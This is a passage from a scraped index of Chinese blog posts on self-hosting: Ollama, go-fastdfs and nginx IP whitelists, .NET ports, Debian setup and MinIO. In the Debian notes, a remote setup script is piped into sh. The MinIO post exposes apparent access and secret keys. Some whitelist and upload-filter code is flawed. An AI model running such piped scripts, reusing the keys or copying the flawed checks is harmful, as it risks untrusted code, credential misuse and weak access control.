https://www.runoob.com/ollama/ollama-api.html\n","permalink":"https://qfsyso.github.io/posts/ollama-gpt-qwen-gemma2-deepseek-loacl-ai/","summary":"ollama https://ollama.com/ ollama\nhttps://ollama.com/library models\nollama run qwen2 send a message ollama run gemma2 https://github.com/open-webui/open-webui webui\ndocker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main N卡 gpu\ndocker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:cuda http://localhost:3000/\ndeepseek https://ollama.com/library/deepseek-coder-v2 deepseek-coder-v2 ~~ codeqwen sqlcoder\ncurl -X POST http://localhost:11434/api/generate -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;llama2-chinese:7b-chat-q4_0\u0026#34;, \u0026#34;prompt\u0026#34;:\u0026#34;为什么天空是蓝色的\u0026#34; }\u0026#39; https://docs.openwebui.com/\nOpen WebUI Open WebUI https://docs.openwebui.com/ 安装默认配置","title":"ollama gpt qwen gemma2 deepseek loacl AI"},{"content":"在go-fastdfs项目中，要实现IP白名单限制上传功能，你需要在处理上传请求的地方进行检查。根据你提供的代码，上传逻辑主要在server.go文件中的HttpHandler的ServeHTTP方法里通过调用mux.ServeHTTP(res, req)来分发请求到不同的处理函数。\nIP白名单限制 定义白名单：首先需要定义一个变量来存储允许的IP地址。可以在server.go的Server结构体中添加一个字段来存储这个白名单。\ntype Server struct { // ... 其他字段 ... allowedIPs map[string]struct{} } func NewServer() *Server { server := \u0026amp;Server{ // ... 初始化其他字段 ... allowedIPs: make(map[string]struct{}), } // 假设允许的IP是 \u0026#34;192.168.1.1\u0026#34; 和 \u0026#34;10.12.188.85\u0026#34; server.allowedIPs[\u0026#34;192.168.1.1\u0026#34;] = struct{}{} server.allowedIPs[\u0026#34;10.12.188.85\u0026#34;] = struct{}{} return server } 修改HttpHandler：在HttpHandler的ServeHTTP方法中添加一个检查逻辑，以确定请求的IP是否在白名单中。\nfunc (httpHandler *HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) { if !server.isIPAllowed(req) { http.Error(res, \u0026#34;Access denied\u0026#34;, http.StatusForbidden) return } // 原有的处理逻辑 mux.ServeHTTP(res, req) } func (server *Server) isIPAllowed(req *http.Request) bool { clientIP := req.RemoteAddr // 检查IP是否在白名单中 _, allowed := server.allowedIPs[clientIP] return allowed } 调用修改后的NewServer：确保在初始化服务器时使用修改后的NewServer函数来创建Server实例，并设置白名单。\n更新InitServer函数：在InitServer函数中，确保使用修改后的NewServer函数。\nfunc InitServer() { // ... 省略其他代码 ... server = NewServer() // 使用修改后的构造函数 // ... 省略其他代码 ... } 重新编译和部署：对项目进行重新编译，并部署修改后的代码。 这样，任何不符合白名单中的IP地址的上传请求都将被拒绝，返回HTTP状态403 Forbidden。请根据你的项目结构和配置适当调整上述代码。\n只限制upload 如果你想只对特定的接口（如 /group1/upload）实施IP白名单限制，而不影响其他页面或图片的访问，你可以在处理上传请求的特定路由中添加IP检查逻辑。以下是如何实现这个目的的步骤：\n定义白名单：首先，定义一个变量来存储允许上传的IP地址。\nvar allowedUploadIPs = map[string]struct{}{ \u0026#34;192.168.1.1\u0026#34;: {}, \u0026#34;10.12.188.85\u0026#34;: {}, // 可以继续添加更多的允许上传的IP地址 } 修改上传处理函数：找到处理 /group1/upload 路由的函数，这可能是 Server 结构体的一个方法，比如 Upload 方法。在这个函数的开始处添加IP检查逻辑。\nfunc (c *Server) Upload(w http.ResponseWriter, r *http.Request) { if !isIPAllowed(r) { http.Error(w, \u0026#34;Access denied\u0026#34;, http.StatusForbidden) return } // 原有的上传处理逻辑 // ... } func isIPAllowed(r *http.Request) bool { clientIP := c.GetRealIp(r) // 确保这个方法返回的是请求的IP地址 _, allowed := allowedUploadIPs[clientIP] return allowed } 更新路由：确保你的路由设置正确地将 /group1/upload 请求映射到 Upload 方法。\nfunc (c *Server) initRouter() { // 其他路由设置... // 映射/group1/upload到Upload方法 // 注意这里的具体实现可能依赖于你使用的HTTP多路复用器或框架 mux.HandleFunc(\u0026#34;/group1/upload\u0026#34;, c.Upload) } 不要在其他路由中添加IP检查：确保只有 /group1/upload 路由的处理函数中添加了IP检查逻辑。其他路由的处理函数保持不变，这样就不会对其他页面或图片的访问造成影响。\n重新编译和部署：对项目进行重新编译，并部署修改后的代码。\n通过这种方式，只有当用户尝试访问 /group1/upload 接口时，才会检查IP白名单；其他所有路由和资源的访问都不会受到IP白名单的限制。请根据你的实际代码结构和路由设置适当调整上述示例代码。\n忽略端口 HTTP请求的远程地址（r.RemoteAddr）通常包含IP地址和端口号，格式如IP:PORT。如果你希望在检查IP白名单时忽略端口号，只根据IP地址来判断，你需要从r.RemoteAddr中提取出IP地址部分。\n在Go语言中，你可以使用strings.Split函数来分割字符串，获取IP地址。以下是调整后的isIPAllowed函数：\nfunc (server *Server) isIPAllowed(r *http.Request) bool { clientIPPort := r.RemoteAddr // 包含IP和端口号，例如 \u0026#34;192.168.80.123:56533\u0026#34; clientIPParts := strings.Split(clientIPPort, \u0026#34;:\u0026#34;) // 分割为 [\u0026#34;192.168.80.123\u0026#34;, \u0026#34;56533\u0026#34;] if len(clientIPParts) \u0026lt; 2 { // 如果分割后的结果不足2部分，说明没有端口号，直接返回不允许 return false } clientIP := clientIPParts[0] // 提取IP地址 // 检查IP是否在白名单中 _, allowed := server.allowedIPs[clientIP] return allowed } 这段代码首先将r.RemoteAddr按照\u0026quot;:\u0026ldquo;分割成两部分，第一部分是IP地址，第二部分是端口号。然后，它检查分割后的数组长度是否至少为2，以确保端口号存在。如果长度小于2，则可能表示远程地址格式不正确，此时函数返回false，表示不允许访问。如果长度足够，它将取出IP地址部分，并检查该IP是否在白名单中。\n请确保server.allowedIPs已经被正确初始化并包含了所有允许的IP地址。例如：\nserver.allowedIPs = map[string]struct{}{ \u0026#34;192.168.80.123\u0026#34;: {}, // 允许的IP地址 // 可以继续添加更多的IP地址 } 这样，isIPAllowed函数就可以根据IP地址而不是IP和端口的组合来判断请求是否被允许。\n复习 //http.DefaultServeMux.ServeHTTP(res, req) if !server.isIPAllowed(req) { http.Error(res, \u0026#34;Access denied\u0026#34;, http.StatusForbidden) return } mux.ServeHTTP(res,req) func (server *Server) isIPAllowed(req *http.Request) bool { clientIP := req.RemoteAddr fmt.Println(\u0026#34;ip \u0026#34; + clientIP) // 检查IP是否在白名单中 _, allowed := server.allowedIPs[clientIP] return allowed } http_upload.go\nfunc (c *Server) Upload(w http.ResponseWriter, r *http.Request) { if !server.isIPAllowed(r) { http.Error(w, \u0026#34;Access denied\u0026#34;, http.StatusForbidden) return } } 要点\nfunc (c *Server) Upload(w http.ResponseWriter, r *http.Request) { //权限IP 限制文件类型 func (c *Server) SaveUploadFile(file multipart.File, header *multipart.FileHeader, fileInfo *FileInfo, r *http.Request) (*FileInfo, error) { _, fileInfo.Name = filepath.Split(header.Filename) //如果不是 jpg png data 则不让上传 fileInfo.Name = c.TrimFileNameSpecialChar(fileInfo.Name) fmt.Println(\u0026#34;fname- \u0026#34; +fileInfo.Name) extension := strings.Split(fileInfo.Name, \u0026#34;.\u0026#34;)[1] if extension != \u0026#34;jpg\u0026#34; \u0026amp;\u0026amp; extension != \u0026#34;png\u0026#34; \u0026amp;\u0026amp; extension != \u0026#34;data\u0026#34; { fmt.Println(\u0026#34;fnameext- \u0026#34; +extension) return fileInfo, err } ","permalink":"https://qfsyso.github.io/posts/gofastdfs-whitelist/","summary":"在go-fastdfs项目中，要实现IP白名单限制上传功能，你需要在处理上传请求的地方进行检查。根据你提供的代码，上传逻辑主要在server.go文件中的HttpHandler的ServeHTTP方法里通过调用mux.ServeHTTP(res, req)来分发请求到不同的处理函数。\nIP白名单限制 定义白名单：首先需要定义一个变量来存储允许的IP地址。可以在server.go的Server结构体中添加一个字段来存储这个白名单。\ntype Server struct { // ... 其他字段 ... allowedIPs map[string]struct{} } func NewServer() *Server { server := \u0026amp;Server{ // ... 初始化其他字段 ... allowedIPs: make(map[string]struct{}), } // 假设允许的IP是 \u0026#34;192.168.1.1\u0026#34; 和 \u0026#34;10.12.188.85\u0026#34; server.allowedIPs[\u0026#34;192.168.1.1\u0026#34;] = struct{}{} server.allowedIPs[\u0026#34;10.12.188.85\u0026#34;] = struct{}{} return server } 修改HttpHandler：在HttpHandler的ServeHTTP方法中添加一个检查逻辑，以确定请求的IP是否在白名单中。\nfunc (httpHandler *HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) { if !server.isIPAllowed(req) { http.Error(res, \u0026#34;Access denied\u0026#34;, http.StatusForbidden) return } // 原有的处理逻辑 mux.ServeHTTP(res, req) } func (server *Server) isIPAllowed(req *http.","title":" Gofastdfs whitelist"},{"content":"在 Debian 系统上安装 Nginx\n更新包列表：\nsudo apt update 安装 Nginx： 使用 apt 包管理器来安装 Nginx。\nsudo apt install nginx 启动 Nginx：\nsudo systemctl start nginx 启用开机自启动：\nsudo systemctl enable nginx 检查 Nginx 状态：\nsudo systemctl status nginx 配置防火墙（可选）：\nsudo ufw allow \u0026#39;Nginx Full\u0026#39; 访问你的服务器： 安装完成后，你可以通过浏览器访问你的服务器 IP 地址来验证 Nginx 是否安装成功。你应该会看到默认的 Nginx 欢迎页面。\n配置 HTTPS（可选）\n如果你希望使用 HTTPS，可以按照以下步骤操作：\n获取 SSL 证书： 可以使用 Let\u0026rsquo;s Encrypt 免费获取一个 SSL 证书。运行以下命令来安装 Certbot 和 Nginx 插件：\nsudo apt install certbot python3-certbot-nginx 获取并安装证书： 运行以下命令来获取并安装证书：\nsudo certbot --nginx -d yourdomain.com 请将 yourdomain.com 替换为你的实际域名。\n配置自动更新证书： 你可以设置一个 cron 任务来自动更新证书，运行以下命令来设置定时任务：\nsudo systemctl enable certbot-renewal sudo nano /etc/nginx/sites-available/fastdfs 在文件中添加以下内容：\nnginx\nserver { listen 80; server_name yourdomain.com; # 允许的IP地址列表 allow 192.168.1.0/24; allow 10.0.0.0/8; deny all; location /group1/M00 { proxy_pass http://localhost:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } 请将 yourdomain.com 替换为你的实际域名，并确保 IP 地址列表与你的需求匹配。\nsudo systemctl stop nginx sudo systemctl start nginx ","permalink":"https://qfsyso.github.io/posts/nginx-whitelist/","summary":"在 Debian 系统上安装 Nginx\n更新包列表：\nsudo apt update 安装 Nginx： 使用 apt 包管理器来安装 Nginx。\nsudo apt install nginx 启动 Nginx：\nsudo systemctl start nginx 启用开机自启动：\nsudo systemctl enable nginx 检查 Nginx 状态：\nsudo systemctl status nginx 配置防火墙（可选）：\nsudo ufw allow \u0026#39;Nginx Full\u0026#39; 访问你的服务器： 安装完成后，你可以通过浏览器访问你的服务器 IP 地址来验证 Nginx 是否安装成功。你应该会看到默认的 Nginx 欢迎页面。\n配置 HTTPS（可选）\n如果你希望使用 HTTPS，可以按照以下步骤操作：\n获取 SSL 证书： 可以使用 Let\u0026rsquo;s Encrypt 免费获取一个 SSL 证书。运行以下命令来安装 Certbot 和 Nginx 插件：\nsudo apt install certbot python3-certbot-nginx 获取并安装证书： 运行以下命令来获取并安装证书：","title":"Nginx whitelist"},{"content":"在 .NET8 中，在 Program 类中配置服务和请求管道\n示例 using Microsoft.AspNetCore.Builder; using Microsoft.AspNetCore.Hosting; using Microsoft.Extensions.DependencyInjection; using Microsoft.Extensions.Hosting; namespace WServer { public class Program { public static void Main(string[] args) { var builder = WebApplication.CreateBuilder(args); // Add services to the container. builder.Services.AddControllersWithViews(); var app = builder.Build(); // Configure the HTTP request pipeline. if (!app.Environment.IsDevelopment()) { app.UseExceptionHandler(\u0026#34;/Home/Error\u0026#34;); } app.UseStaticFiles(); app.UseRouting(); app.UseAuthorization(); app.MapControllerRoute( name: \u0026#34;default\u0026#34;, pattern: \u0026#34;{controller=Home}/{action=Index}/{id?}\u0026#34;); // 设置默认启动端口 app.Urls.Add(\u0026#34;http://localhost:5000\u0026#34;); // 这里设置为 5000 app.Run(); } } } 启动时自动从环境变量或配置文件中读取端口号\nvar port = Environment.GetEnvironmentVariable(\u0026#34;ASPNETCORE_PORT\u0026#34;) ?? \u0026#34;5000\u0026#34;; app.Urls.Add($\u0026#34;http://localhost:{port}\u0026#34;); 也可以从配置文件中读取端口号，例如 appsettings.json：\nvar port = builder.Configuration.GetValue\u0026lt;int\u0026gt;(\u0026#34;Port\u0026#34;).ToString(); app.Urls.Add($\u0026#34;http://localhost:{port}\u0026#34;); 多端口号 // 配置 IConfiguration var configuration = builder.Configuration; // 读取端口配置列表 var ports = configuration.GetSection(\u0026#34;Ports\u0026#34;).Get\u0026lt;List\u0026lt;int\u0026gt;\u0026gt;() ?? new List\u0026lt;int\u0026gt;(); foreach (var port in ports) { app.Urls.Add($\u0026#34;http://localhost:{port}\u0026#34;); } appsettings.json 文件包含了一个端口列表：\n{ \u0026#34;Ports\u0026#34;: [5000, 5001] // 配置多个端口 } debian 当你在 Debian 系统上运行 dotnet run 并能够通过 http://localhost:5000 访问应用程序，但无法通过 IP:5000 访问时，这通常意味着你的应用程序只绑定到了本地回环接口（即 localhost），而没有绑定到所有可用的网络接口。以下是一些可能的解决方案：\n确保应用程序绑定到所有接口：默认情况下，ASP.NET Core 应用程序应该监听所有可用的网络接口。如果你的应用程序只绑定到 localhost，你需要确保它绑定到 0.0.0.0，这代表所有网络接口。在 Program 类中设置 app.Urls 时，不要使用 localhost，而是使用 0.0.0.0：\napp.Urls.Add(\u0026#34;http://0.0.0.0:5000\u0026#34;); 检查防火墙设置：确保你的 Debian 系统上的防火墙没有阻止外部访问端口 5000。你可以使用 ufw 命令行工具来管理防火墙规则。例如，允许端口 5000 可以通过以下命令：\nsudo ufw allow 5000/tcp 检查网络配置：确保你的网络配置允许外部访问。这可能涉及到虚拟网络、容器网络或其他网络隔离技术。\n使用环境变量：ASP.NET Core 应用程序也可以通过环境变量来设置 URL。你可以设置 ASPNETCORE_URLS 环境变量，然后在运行应用程序之前不指定具体的 app.Urls.Add：\nexport ASPNETCORE_URLS=http://0.0.0.0:5000 dotnet run 检查 Kestrel 服务器配置：Kestrel 是 ASP.NET Core 的默认 HTTP 服务器，它可能有自己的配置。确保 Kestrel 配置为监听所有接口。这可以在 Program 类中设置：\nbuilder.WebHost.ConfigureKestrel(serverOptions =\u0026gt; { serverOptions.ListenAnyIP(5000); }); 检查端口是否被占用：确保端口 5000 没有被其他服务占用。你可以使用 netstat -tuln | grep 5000 来检查端口的使用情况。\n使用 dotnet 命令的额外参数：当你使用 dotnet run 命令时，可以通过 -urls 参数来指定 URL，例如：\ndotnet run --urls \u0026#34;http://0.0.0.0:5000\u0026#34; dibian .NET8环境 注册微软密钥和软件仓库。\nwget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb 安装.NET SDK。\nsudo apt-get update; \\ sudo apt-get install -y apt-transport-https \u0026amp;\u0026amp; \\ sudo apt-get update \u0026amp;\u0026amp; \\ sudo apt-get install -y dotnet-sdk-8.0 验证安装。\ndotnet --version ","permalink":"https://qfsyso.github.io/posts/.net-web-port/","summary":"在 .NET8 中，在 Program 类中配置服务和请求管道\n示例 using Microsoft.AspNetCore.Builder; using Microsoft.AspNetCore.Hosting; using Microsoft.Extensions.DependencyInjection; using Microsoft.Extensions.Hosting; namespace WServer { public class Program { public static void Main(string[] args) { var builder = WebApplication.CreateBuilder(args); // Add services to the container. builder.Services.AddControllersWithViews(); var app = builder.Build(); // Configure the HTTP request pipeline. if (!app.Environment.IsDevelopment()) { app.UseExceptionHandler(\u0026#34;/Home/Error\u0026#34;); } app.UseStaticFiles(); app.UseRouting(); app.UseAuthorization(); app.MapControllerRoute( name: \u0026#34;default\u0026#34;, pattern: \u0026#34;{controller=Home}/{action=Index}/{id?}\u0026#34;); // 设置默认启动端口 app.Urls.Add(\u0026#34;http://localhost:5000\u0026#34;); // 这里设置为 5000 app.Run(); } } } 启动时自动从环境变量或配置文件中读取端口号","title":" .NET Web Port"},{"content":"debian12.5.0服务器安装 参考https://blog.csdn.net/Go_ahead_forever/article/details/132679793\n相关命令问题 新用户使用sudo报错 xx is not the sudoers file. 原因：book用户没有sudo的权限 解决：https://blog.csdn.net/weixin_37787043/article/details/123045557\n更新 清华-镜像源 (会快一些)： 参考文档： https://blog.csdn.net/sinat_15028281/article/details/135638596\nsu root cp etc/apt/sources.list etc/apt/sources.list.backup // 备份 vi etc/apt/sources.list\t// 修改镜像源 将etc/apt/sources.list文件内的内容清空，写入以下内容：\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware deb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware # deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware 安装SSH 安装：\nsudo apt-get install ssh 启动：\nsudo systemctl start ssh 启动则可ssh 查看：\nsudo systemctl status ssh 安装vscode 进入页面：https://code.visualstudio.com/docs/?dv=linux64_deb 自动下载安装包\ncd downloads 找到下载目录执行：\nsudo dpkg -i code_1.88.1-1712771838_amd64.deb 安装docker Debian12.5: https://blog.csdn.net/qq_39997939/article/details/131405963 严格按步骤复制即可。 别用其他网站的安装方式，很容易错！！！！！ Ubuntu18.04: ubuntu18.04安装docker_ubuntu 18.04安装docker-CSDN博客\n安装构建基础包 它含有libc、gcc、g++、make、dpkg-dev 执行命令：\nsudo apt update \u0026amp;\u0026amp; sudo apt install build-essential win https://blog.csdn.net/weixin_52799373/article/details/139039181\nwin测通道xxx https://knowledge.broadcom.com/external/article?legacyId=79832\nubt安装wx deepin wine的方式\n1）运行如下一条命令将移植仓库添加到系统中 wget -O- https://deepin-wine.i-m.dev/setup.sh | sh 自此以后，你可以像对待普通的软件包一样，使用apt-get系列命令进行各种应用安装、更新和卸载清理了。\n2）安装微信 sudo apt-get install com.qq.weixin.deepin 将com.qq.weixin.deepin替换为下列包名，可以继续安装其他应用：\n应用\t包名 QQ\tcom.qq.im.deepin WXWork\tcom.qq.weixin.work.deepin\n备注： 完整列表参见 https://deepin-wine.i-m.dev . 找到一个比较好的deepin版本后，不要轻易升级，否则很可能会出现不兼容。 安装后，如果以上网站上更新了新的包，可以如下方式进行升级：sudo apt-get upgrade com.qq.weixin.deepin\n","permalink":"https://qfsyso.github.io/posts/vm-linux-win/","summary":"debian12.5.0服务器安装 参考https://blog.csdn.net/Go_ahead_forever/article/details/132679793\n相关命令问题 新用户使用sudo报错 xx is not the sudoers file. 原因：book用户没有sudo的权限 解决：https://blog.csdn.net/weixin_37787043/article/details/123045557\n更新 清华-镜像源 (会快一些)： 参考文档： https://blog.csdn.net/sinat_15028281/article/details/135638596\nsu root cp etc/apt/sources.list etc/apt/sources.list.backup // 备份 vi etc/apt/sources.list\t// 修改镜像源 将etc/apt/sources.list文件内的内容清空，写入以下内容：\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware deb https://security.","title":" VM Linux win"},{"content":"go-fastdfs Go-fastdfs 是简单、可靠、高效的分布式文件系统。\n安装 https://sjqzhang.github.io/go-fastdfs/#character\nor https://github.com/sjqzhang/go-fastdfs/releases\n启动 ./fileserver server docker部署 docker run --network=host --name fastdfs -v /data/fastdfs_data:/data -p 8080:8080 -e GO_FASTDFS_DIR=/data sjqzhang/go-fastdfs .NET 参考java实现 https://sjqzhang.github.io/go-fastdfs/usage.html#java\nprivate static readonly string UPLOAD_PATH2 = \u0026#34;go-fastdfs地址XXX:XX\u0026#34;; [HttpPost(\u0026#34;FormFile\u0026#34;)] public async Task\u0026lt;string\u0026gt; UploadGo(IFormFile file) { if (file == null || file.Length == 0) { return \u0026#34;File is empty\u0026#34;; } string result = string.Empty; try { using (var httpClient = new HttpClient()) { using (var form = new MultipartFormDataContent()) { var streamContent = new StreamContent(file.OpenReadStream()); streamContent.Headers.Add(\u0026#34;Content-Disposition\u0026#34;, $\u0026#34;form-data; name=\\\u0026#34;file\\\u0026#34;; filename=\\\u0026#34;{file.FileName}\\\u0026#34;\u0026#34;); form.Add(streamContent, \u0026#34;file\u0026#34;, file.FileName); form.Add(new StringContent(\u0026#34;default\u0026#34;), \u0026#34;scene\u0026#34;); form.Add(new StringContent(\u0026#34;20240619\u0026#34;), \u0026#34;path\u0026#34;); form.Add(new StringContent(\u0026#34;json2\u0026#34;), \u0026#34;output\u0026#34;); form.Add(new StringContent(\u0026#34;upload\u0026#34;), \u0026#34;submit\u0026#34;); var response = await httpClient.PostAsync(UPLOAD_PATH2, form);//await result = await response.Content.ReadAsStringAsync();//await Console.WriteLine($\u0026#34;resp: {response}\u0026#34;); } } } catch (Exception e) { Console.WriteLine(e.ToString()); } return result; } \u0026ldquo;url\u0026rdquo;: \u0026ldquo;http://xxx/group1/20240619/test1619.png?name=test1619.png\u0026amp;download=1\u0026rdquo;\npython import requests url = \u0026#39;http://xxx:xx/group1/upload\u0026#39; files = {\u0026#39;file\u0026#39;: open(\u0026#39;resized240525.jpg\u0026#39;, \u0026#39;rb\u0026#39;)} options={\u0026#39;output\u0026#39;:\u0026#39;json\u0026#39;,\u0026#39;path\u0026#39;:\u0026#39;20240619\u0026#39;,\u0026#39;scene\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;filename\u0026#39;:\u0026#39;test123.jpg\u0026#39;} r = requests.post(url,data=options, files=files) print(r.text) 集群 \u0026#34;peers\u0026#34;: [\u0026#34;http://192.168.44.128:8080\u0026#34;,\u0026#34;http://192.168.31.36:8080\u0026#34;], web manage go-fastdfs web - java 1.安装 下载地址：https://github.com/perfree/go-fastdfs-web/releases/download/v1.3.4/go-fastdfs-web-1.3.4.tar.gz 到 官方下载页面 下载所需的版本(带jre或者不带jre)\nwget https://github.com/perfree/go-fastdfs-web/releases/download/v1.3.4/go-fastdfs-web-1.3.4.tar.gz 项目地址：https://github.com/perfree/go-fastdfs-web 各打包版本下载地址：https://github.com/perfree/go-fastdfs-web/releases\n2、解压运行： tar -zxvf go-fastdfs-web-1.3.4.tar.gz cd /opt/go-fastdfs-web/ ./goFastDfsWeb.sh start 也可以 (java环境)：\njava -jar go-fastdfs-web.jar 3、访问监控页面： ip:8088 GoFastDfs-Web管理平台安装页面 安装完即可使用\ngo_web_版本 https://github.com/perfree/go-fastdfs-web-go\n","permalink":"https://qfsyso.github.io/posts/go-fastdfs/","summary":"go-fastdfs Go-fastdfs 是简单、可靠、高效的分布式文件系统。\n安装 https://sjqzhang.github.io/go-fastdfs/#character\nor https://github.com/sjqzhang/go-fastdfs/releases\n启动 ./fileserver server docker部署 docker run --network=host --name fastdfs -v /data/fastdfs_data:/data -p 8080:8080 -e GO_FASTDFS_DIR=/data sjqzhang/go-fastdfs .NET 参考java实现 https://sjqzhang.github.io/go-fastdfs/usage.html#java\nprivate static readonly string UPLOAD_PATH2 = \u0026#34;go-fastdfs地址XXX:XX\u0026#34;; [HttpPost(\u0026#34;FormFile\u0026#34;)] public async Task\u0026lt;string\u0026gt; UploadGo(IFormFile file) { if (file == null || file.Length == 0) { return \u0026#34;File is empty\u0026#34;; } string result = string.Empty; try { using (var httpClient = new HttpClient()) { using (var form = new MultipartFormDataContent()) { var streamContent = new StreamContent(file.","title":"Go-fastdfs"},{"content":"开源免费的Authenticator: 2FA Client，支持多种浏览器。\n开源地址：Authenticator-Extension https://github.com/Authenticator-Extension/Authenticator\nEdge扩展：Authenticator: 2FA Client - Microsoft Edge Addons https://microsoftedge.microsoft.com/addons/detail/authenticator-2fa-client/ocglkepbibnalbgmbachknglpdipeoio\nChrome扩展：身份验证器 - Chrome 应用商店 (google.com) https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai\n安装好这个扩展程序以后，再次进入GitHub验证界面，等待二维码弹出。\n二维码弹出以后，点击浏览器扩展，点击Authenticator: 2FA Client\n点击二维码，选择指定区域，进行操作，等待代码就可以了。\nEnable two-factor authentication (2FA)\n","permalink":"https://qfsyso.github.io/posts/2fa-enable-two-factor-authentication-2fa/","summary":"开源免费的Authenticator: 2FA Client，支持多种浏览器。\n开源地址：Authenticator-Extension https://github.com/Authenticator-Extension/Authenticator\nEdge扩展：Authenticator: 2FA Client - Microsoft Edge Addons https://microsoftedge.microsoft.com/addons/detail/authenticator-2fa-client/ocglkepbibnalbgmbachknglpdipeoio\nChrome扩展：身份验证器 - Chrome 应用商店 (google.com) https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai\n安装好这个扩展程序以后，再次进入GitHub验证界面，等待二维码弹出。\n二维码弹出以后，点击浏览器扩展，点击Authenticator: 2FA Client\n点击二维码，选择指定区域，进行操作，等待代码就可以了。\nEnable two-factor authentication (2FA)","title":"2FA-Enable two-factor authentication (2FA)"},{"content":"安装MinIO docker\ndocker run --name minio -p 9000:9000 -p 9090:9090 -d -e \u0026#34;MINIO_ROOT_USER=minio\u0026#34; -e \u0026#34;MINIO_ROOT_PASSWORD=minio123\u0026#34; -v /usr/local/minio-data:/data -v /usr/local/minio-config:/root/.minio minio/minio server data --console-address \u0026#34;:9090\u0026#34; --address \u0026#34;:9000\u0026#34; 后台创建 Buckets 访问 localhost:9000 登陆后创建Buckets io617\n创建密钥 Access Keys\nadd package dotnet add package Minio 配置json //... \u0026#34;Minio\u0026#34;: { \u0026#34;Endpoint\u0026#34;: \u0026#34;192.168.80.xx:9000\u0026#34;,//\u0026#34;localhost:9000\u0026#34;, //90/service-account-credentials \u0026#34;AccessKey\u0026#34;: \u0026#34;EctmxSNB9FqfW6UWxxx\u0026#34;, \u0026#34;SecretKey\u0026#34;: \u0026#34;frQhYoH1k7UphMxbwK2PiG2xKadzPjxxx\u0026#34;, \u0026#34;BucketName\u0026#34;: \u0026#34;io617\u0026#34; }, //... 服务类MinioService public class MinioService { private readonly MinioClient _minioClient; private readonly string _bucketName; public MinioService(IConfiguration configuration) { var endpoint = configuration[\u0026#34;Minio:Endpoint\u0026#34;]; var accessKey = configuration[\u0026#34;Minio:AccessKey\u0026#34;]; var secretKey = configuration[\u0026#34;Minio:SecretKey\u0026#34;]; _bucketName = configuration[\u0026#34;Minio:BucketName\u0026#34;]; //http://localhost:9090/api/v1/service-account-credentials _minioClient = (MinioClient?)new MinioClient() .WithEndpoint(endpoint) .WithCredentials(accessKey, secretKey) .Build(); } public async Task UploadFileAsync(string objectName, Stream data, long size, string contentType) { await _minioClient.PutObjectAsync(new PutObjectArgs() .WithBucket(_bucketName) .WithObject(objectName) .WithStreamData(data) .WithObjectSize(size) .WithContentType(contentType)); } public async Task\u0026lt;Stream\u0026gt; GetFileAsync(string objectName) { var memoryStream = new MemoryStream(); await _minioClient.GetObjectAsync(new GetObjectArgs() .WithBucket(_bucketName) .WithObject(objectName) .WithCallbackStream((stream) =\u0026gt; { stream.CopyTo(memoryStream); })); memoryStream.Seek(0, SeekOrigin.Begin); return memoryStream; } } 注入服务 builder.Services.AddSingleton\u0026lt;MinioService\u0026gt;(); 使用服务 public HomeController(ILogger\u0026lt;HomeController\u0026gt; logger,MinioService minioService) { _minioService = minioService;// } testcode [HttpGet] public IActionResult Upload() { return View(); } [HttpPost] public async Task\u0026lt;IActionResult\u0026gt; Upload(IFormFile file) { if (file != null \u0026amp;\u0026amp; file.Length \u0026gt; 0) { using (var stream = file.OpenReadStream()) { await _minioService.UploadFileAsync(file.FileName, stream, file.Length, file.ContentType); } ViewBag.Message = \u0026#34;File uploaded successfully!\u0026#34;; } return View(); } [HttpGet] public async Task\u0026lt;IActionResult\u0026gt; Download(string fileName) { var stream = await _minioService.GetFileAsync(fileName); return File(stream, \u0026#34;application/octet-stream\u0026#34;, fileName); } //use https://localhost:7118/Home/download?filename=bx.png @using (Html.BeginForm(\u0026#34;Upload\u0026#34;, \u0026#34;Home\u0026#34;, FormMethod.Post, new { enctype = \u0026#34;multipart/form-data\u0026#34; })) { \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Upload\u0026lt;/button\u0026gt; } \u0026lt;div\u0026gt; @ViewBag.Message \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; or console\n//TEST string endpoint = \u0026#34;xxx:9000\u0026#34;;//\u0026#34;localhost:9000\u0026#34;; // string accessKey = \u0026#34;EctmxSNB9FqfW6UWrcAY\u0026#34;; // Access Key string secretKey = \u0026#34;frQhYoH1k7UphMxbwK2PiG2xKadzPjTE3q9HgHHk\u0026#34;; //Secret Key 